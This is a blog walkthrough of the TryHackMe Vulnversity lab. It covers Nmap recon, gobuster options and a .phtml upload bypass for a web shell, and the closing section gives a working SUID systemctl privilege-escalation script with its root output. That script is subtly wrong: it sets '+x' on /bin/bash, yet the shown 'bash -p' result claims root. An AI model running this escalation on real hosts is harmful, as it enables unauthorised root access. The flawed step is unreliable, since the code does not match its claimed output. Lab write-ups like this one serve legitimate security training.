---
title: TryHackMe Room Vulnversity
date: 2021-06-09T20:10:48+05:30
lastmod: 2021-06-09T20:10:48+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - Vulnversity

draft: false
description: TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthrough. read more...

---
## Vulnversity

## TASK 01:  Deploy the machine

---

## TASK 02: Reconnaissance

**Tools**

- [Nmap](https://nmap.org)
- CheatSheet

### Flags

|Flag ID|Questions|
|:---|:---:|
|1|There are many nmap "cheatsheets" online that you can use too.|
||N\A|
|2|Scan the box, how many ports are open?|
||![img](https://i.imgur.com/0XgYocm.png)|
|3|What version of the squid proxy is running on the machine?|
||![img](https://i.imgur.com/0XgYocm.png)|
|4|How many ports will nmap scan if the flag -p-400 was used?|
||`400`|
|5|Using the nmap flag -n what will it not resolve?|
||`DNS`|
|6|What is the most likely operating system this machine is running?|
||``ubuntu``|
|7|What port is the web server running on?|
||![img-anir0y](https://i.imgur.com/Tsd6hc7.png)|
|8|Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)|
|||

#### Flag6

based on Nmap Fingerprints. 

---
---

## TASK 03: Locating directories using GoBuster

### `dir` Mode Options

```bash

  gobuster dir [flags]

Flags:
  -f, --add-slash                     Append / to each request
  -c, --cookies string                Cookies to use for the requests
  -e, --expanded                      Expanded mode, print full URLs
  -x, --extensions string             File extension(s) to search for
  -r, --follow-redirect               Follow redirects
  -H, --headers stringArray           Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
  -h, --help                          help for dir
  -l, --include-length                Include the length of the body in the output
  -k, --no-tls-validation             Skip TLS certificate verification
  -n, --no-status                     Don't print status codes
  -P, --password string               Password for Basic Auth
  -p, --proxy string                  Proxy to use for requests [http(s)://host:port]
  -s, --status-codes string           Positive status codes (will be overwritten with status-codes-blacklist if set) (default "200,204,301,302,307,401,403")
  -b, --status-codes-blacklist string Negative status codes (will override status-codes if set)
      --timeout duration              HTTP Timeout (default 10s)
  -u, --url string                    The target URL
  -a, --useragent string              Set the User-Agent string (default "gobuster/3.1.0")
  -U, --username string               Username for Basic Auth
  -d, --discover-backup               Upon finding a file search for backup files
      --wildcard                      Force continued operation when wildcard found

Global Flags:
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist
```

### dns Mode Help

```bash
Usage:
  gobuster dns [flags]

Flags:
  -d, --domain string      The target domain
  -h, --help               help for dns
  -r, --resolver string    Use custom DNS server (format server.com or server.com:port)
  -c, --show-cname         Show CNAME records (cannot be used with '-i' option)
  -i, --show-ips           Show IP addresses
      --timeout duration   DNS resolver timeout (default 1s)
      --wildcard           Force continued operation when wildcard found

Global Flags:
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist
```

### vhost Mode Options

```bash
Usage:
  gobuster vhost [flags]

Flags:
  -c, --cookies string        Cookies to use for the requests
  -r, --follow-redirect       Follow redirects
  -H, --headers stringArray   Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
  -h, --help                  help for vhost
  -k, --no-tls-validation     Skip TLS certificate verification
  -P, --password string       Password for Basic Auth
  -p, --proxy string          Proxy to use for requests [http(s)://host:port]
      --timeout duration      HTTP Timeout (default 10s)
  -u, --url string            The target URL
  -a, --useragent string      Set the User-Agent string (default "gobuster/3.1.0")
  -U, --username string       Username for Basic Auth

Global Flags:
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist
```

### Flag-03

|1|What is the directory that has an upload form page?|
||![img](https://i.imgur.com/AaAwcRw.png)|

---

## task 04: Compromise the webserver

### Flag-04

|Flag ID|Questions|
|:---|:---:|
|1|Try upload a few file types to the server, what common extension seems to be blocked?|
||[`.php`](#flag-41)|
|2|N\a|
|3|Run this attack, what extension is allowed?|
||[`.phtml`](#flag-43)|
|4|Get the Shell working|
||[![Alt text](https://img.youtube.com/vi/QlcZxDPuJTE/hqdefault.jpg)](https://www.youtube.com/watch?v=QlcZxDPuJTE)|
|5|What is the name of the user who manages the webserver?|
||[![TryHackMe](https://img.youtube.com/vi/ugnYyudFY1Y/mqdefault.jpg)](https://www.youtube.com/watch?v=ugnYyudFY1Y)|
|6|What is the user flag?|
||![TryHackMe](https://i.imgur.com/xDyG5Fq.png)|

#### Flag-4.1

php is a common way to get `reserse shell/backdoor` in web application

#### Flag-4.3

intruder gives you diffrent content-length. you can check the response body to verify.

---

## Task 05: Privilege Escalation

### Flag-05

|Flag ID|Questions|
|:---|:---:|
|1|On the system, search for all SUID files. What file stands out?|
|[read](#flag-51)|[`/bin/systemctl`](#flag-51)|
|2|Become root and get the last flag (/root/root.txt)|
||![img](https://i.imgur.com/1qWDfR3.png)|

#### flag-5.1

```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \;
...[snip]...
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
...[snip]...
```

> credit : [Gtfo bins](https://gtfobins.github.io/gtfobins/systemctl/)

![](https://i.imgur.com/5z5748W.png)

## flag-5.2 

```bash
# Run the followning

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +x /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

after successfull run. do this:

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/bash -p #to exploit and gain root priv
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

```

---
